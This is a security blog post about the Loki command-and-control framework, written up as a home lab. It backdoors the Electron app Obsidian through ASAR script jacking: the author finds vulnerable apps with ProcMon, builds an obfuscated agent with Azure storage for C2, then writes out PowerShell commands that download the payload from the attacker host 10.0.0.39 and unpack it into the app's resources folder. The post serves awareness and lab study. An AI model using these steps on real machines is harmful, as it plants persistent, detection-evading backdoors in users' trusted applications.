---
title: ElectronJS - Command and Control via Loki
date: 2025-05-09
excerpt: In this post, I explore Loki C2 - a command and control framework built in NodeJS and targets applications built on ElectronJS
tags:
  - Cybersecurity
  - Tech
  - Hacking
  - CnC
  - ElectronJS
  - Persistence
  - LokiC2
author: pir4cy
coverImage: /images/blog/ep2-cover.png
draft: false
---

In today's post, we look at a Command and Control tool called [Loki](https://github.com/boku7/Loki). This is built on NodeJS and exploits ASAR misconfiguration in ElectronJS.

Sounds like a lot of words, but it is another way for us to create a persistent connection with the target endpoint after a compromise.

Once the connection is generated, we will get backdoor access into the endpoint that we target. This might end up being a long one so here's a summary - 

> **TL;DR:**
> - **What is Loki?** A C2 (Command and Control) framework by [@boku7](https://x.com/0xBoku) that targets ElectronJS apps via ASAR misconfiguration.
> - **What did I do?** Tested Loki on several Electron-based apps, demonstrated how attackers can gain persistent access, and explored the process of agent delivery and execution.
> - **What's next?** Future posts will cover automating agent delivery and launching the target app post-exploitation.

> **Ethical Note:** This post is for educational purposes only. The goal is to raise awareness about ElectronJS security, responsible disclosure and to have a little fun :)

## What's This All About?

I recently came across John Hammond's video about creating a backdoor for Cursor AI(["I Backdoored Cursor AI"](https://www.youtube.com/watch?v=FYok3diZY78)). Obviously, the title was a click-bait, but the video was about a new tool called Loki.

Loki is a C2 framework built by [@boku7](https://x.com/0xBoku) using NodeJS. It is a neat way to avoid EDR detection while creating a persistent connection to a compromised target.

As soon as I learned that this targets applications deployed using ElectronJS, I wanted to test it out. Since there are quite a huge number of web applications that are converted to "desktop applications" using Electron. 

## Overview

### Command and Control

Think of Command and Control (C2) as a secret communication channel that allows attackers to remotely control compromised systems. The attacker can make infected computers perform various actions, from stealing data to spreading to other systems. What makes C2 particularly interesting is how it tries to blend in with normal network traffic, much like a spy trying to look like an ordinary person in a crowd.

The Loki C2 framework we're exploring today takes this concept and applies it specifically to applications built with ElectronJS, a popular framework for creating desktop applications. It's like finding a secret backdoor in a building that everyone thought was secure.

We'll look at other Command and Control methods in this blog down the line.

### Electron JS and ASAR integrity

ElectronJS is a popular framework that lets developers build desktop applications using web technologies like HTML, CSS, and JavaScript. While this makes development easier, it also introduces security challenges. One major concern is how Electron packages its application code in ASAR files, which is a simple extensive archive format designed for Electron apps. Attackers can potentially modify the application's code, injecting malicious payloads that run with the same privileges as the original application.

To prevent this, developers can implement ASAR integrity checks. This involves creating a cryptographic hash of the ASAR file during development and verifying this hash when the application starts. If the hash doesn't match, the application knows its code has been tampered with and can refuse to run. However, many applications skip this crucial security step, leaving them vulnerable to code injection attacks.

Here's a GIF that showcases how Teams can launch malicious code - 
![Teams Electron GIF](/images/blog/ep2-teams-electron.gif)

## Real-World Applications

As mentioned earlier, going from web application to desktop application using ElectronJS is a very popular way to deploy your application as a desktop app. 

Therefore, I had quite a big list of electron based applications to test. This list can be viewed at [Electron Showcase](https://www.electronjs.org/apps)

![Electron Showcase](/images/blog/ep2-electron-showcase.png)

A lot of the big apps were already tested by others who have come across this tool - Teams, Discord, Slack, Cursor AI, VS Code, **Obsidian** are just some big ones from the extensive list. 


## Discover Vulnerable Electron Apps

Loki's Github page goes into the steps needed to discover apps that might be vulnerable to Script Jacking.

Using Obsidian as an example, here's how you can check if an app is vulnerable - 
1. Download the electron app. In our case this is Obsidian, which can be found at - [Obsidian Official Link](https://obsidian.md/) 
2. Find the root folder for the app, this will look something like
```
+ C:\Users\Barry Allen\AppData\Local\Programs\Obsidian
```

![Discovery-Root-Folder](/images/blog/ep2-discovery-root-folder.png)
3. In an ideal scenario, you should copy/paste this folder to another folder that you control to preserve the original app, and then delete the contents of `\resources\*` in your test copy.
4. Since this is a test, I created a copy of the resources, saved them somewhere else and then proceeded to delete the contents.
5. Launch ProcMon ([SysInternals - Procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)) and add these filters:
```
ProcessName = Obsidian.exe
Path contains resources
```

![Discovery-Procmon](/images/blog/ep2-discovery-procmon.png)
6. Then we start the application directly and wait for the logs.
7. We can see that the application first looks for `app.asar` and when that fails, it looks for `resources\app\packages.json`. This indicates that the app is vulnerable to script jacking.
![Discovery-Procmon-2](/images/blog/ep2-discovery-procmon2.png)

## The Setup

It's recommended to run the Loki Client on the same OS as the target machine, so we'll use a Windows attacker machine for this. 
- Attacker Machine
```
+ IP Address: 10.0.0.39
+ OS: Windows 11 Pro
+ User: Eobard Thawne
```
- Target Machine
```
+ IP Address: 10.0.0.14
+ OS: Windows 11 Pro
+ User: Barry Allen
```
## Preparing Loki Agent
As I stated in the beginning, this scenario assumes a compromised system where we are able to inject Loki code on the system and receive a callback beacon to our cloud storage. 

I'm gonna keep the steps short, the full steps are available here ([Loki GitHub](https://github.com/boku7/Loki))
- Create an Azure Storage account for C2 storage.
	- Create a Storage account in your Azure portal with the following configuration:
		- Subscription: Select your subscription.
		- Resource Group: Click Create new or select an existing one.
		- Storage Account Name: Enter a unique name (e.g., 7200727c985343598e3646).
		- Redundancy: Locally Redundant Storage (LRS).
	![Azure Storage Account](/images/blog/ep2-azure-1.png) 
	- Generate a Shared Access Signature (*in Security + networking > Shared access signatures*) with the following config:
		- Permissions: Check all (Read, Write, Delete, List, Add, Create, Update, Process).
		- Allowed Services: Select Blob, Queue, Table.
		- Allowed Resource Types: Select Service, Container, Object.
		- Expiry Date: Set to 3 months from today. 
		- Protocol: Choose HTTPS only.
		![Azure SAS values](/images/blog/ep2-azure-2.png)
- On the attacker machine, clone Loki from github.
	`git clone https://github.com/boku7/Loki.git && cd Loki\`
- Install NodeJS
	`winget install nodejs`  
- Install `javascript-obfuscator`
	`npm install --save-dev javascript-obfuscator`
- Run the script `obfuscateAgent.js` to create a Loki payload with the Storage account info, that we saved earlier.

Make sure to save the Storage Account, SAS token and MetaContainer as 
these will be used for our Loki client to connect to Azure.

![Loki-Agent-Create](/images/blog/ep2-agent-create.png)

Now that we have an agent ready, let's upload it to our target and let's see what happens.-
```
Compress-Archive -Path .\app\* -DestinationPath .\app.zip
```

## Delivering the Agent 
The script we used earlier creates an `/app/` directory. We want to replace the target app's `resources/*` data with this app folder. 

For the purpose of my testing I used a tool called `updog` which allows me to host a file server and transfer files via HTTP/S. 
```
pip3 install updog && updog
```
This will launch the server in the Loki directory of our attacker machine.

![Updog](/images/blog/ep2-updog.png)

Let's head over to our target and download the Agent. 
```
cd Downloads\
mkdir Obsidian_Update-latest\
Invoke-WebRequest http://10.0.0.39:9090/app.zip -OutFile app.zip
```

![Updog](/images/blog/ep2-agent-download.png)

Now that we have our zip on the target machine, we can replace the files for Obsidian with our agent.
```
Expand-Archive -Path .\app.zip -DestinationPath 'C:\Users\Barry Allen\AppData\Local\Programs\Obsidian\resources\app\'
```

![Agent Delivered](/images/blog/ep2-agent-delivered.png)


## The Execution
Now comes the best part, launching Obsidian.exe just like a regular user would.

Before we do that though, let's setup the Loki Client on our attacker machine.
We'll need to use the values we saved earlier when we were configuring the agent. ([[#Preparing Loki Agent]])

![Preparing Client](/images/blog/ep2-client-setup.png)

To monitor this better, I used Procmon and used the following filters
```
+ Process Name is Obsidian.exe
+ Operation contains TCP
```

And voila, we have a connection!
![Pwnage](/images/blog/ep2-pwnage.png)
### Tips 
- Make sure you're using the published release for the Loki Client. For my first few attempts, I was using the latest build which has an error that's preventing a successful connection. At the time of writing, I haven't had a chance to dig deeper, but it's likely a simple fix if you want to try troubleshooting it yourself.
	![Latest-Build-Error](/images/blog/ep2-latest-build-error.png)
- Now as you might have noticed, the Obsidian app (or your target electron app) did not launch like it normally would. This is expected since we removed all the app resources from their main folder.
	- There is a workaround for it posted on the github. At the time of this post, the workaround exists under a `proxyapp/` folder on the Loki github. 
	- So far, it's only been tested for Cursor and QRLWallet.
- I highly recommend going over the original Git for a deeper understanding of Loki and Electron Script Jacking.

## Wrapping Up

This was just a showcase of how Loki works and how Electron-based can be exploited for script jacking. Apart from testing Obsidian, I also tested the following apps - 
+ Franz - v 5.11.0
+ Ferdium - v 7.0.1
+ Notion - not vulnerable 

What actually piqued my interest was the part about launching the target app as well as the Loki client. That is definitely promising and should be explored further. [@JohnHammond](https://x.com/_johnhammond) and [@boku](https://x.com/0xBoku) were able to do it for Cursor and I'd definitely want to look into it and see if I can emulate the same on the apps that I tested.

> **Why this matters:**
> Understanding Electron exploitation is crucial as more apps move to cross-platform desktop frameworks. Awareness helps developers secure their apps and helps defenders recognize new attack surfaces.

In a future post, I'll look into launching the application as well as potentially automating the delivery of the agent onto the target (unless the creator of Loki doesn't beat me to it).

## Want to Learn More?

- For more information on ASAR integrity and Electron security:
	- [Electron Security Checklist](https://www.electronjs.org/docs/latest/tutorial/security)
	- [ASAR Integrity Protection](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)

- For more information and updates on Loki: 
	- [Loki C2 Github](https://github.com/boku7/Loki)

- JavaScript Obfuscator also exists as an online tool - https://obfuscator.io/  

- Links for software tested
	- [Obsidian Official Link](https://obsidian.md/) - One of the best note-taking software I've tried so far.
	- [Ferdium Official Link](https://ferdium.org/) - Great app for an all-in-one services (discord, slack, chatgpt, etc)
	- [Franz Official Link](https://meetfranz.com/) - Similar to Ferdium but has paid services also.
	- [Notion](https://www.notion.so/) - Another great note taking software.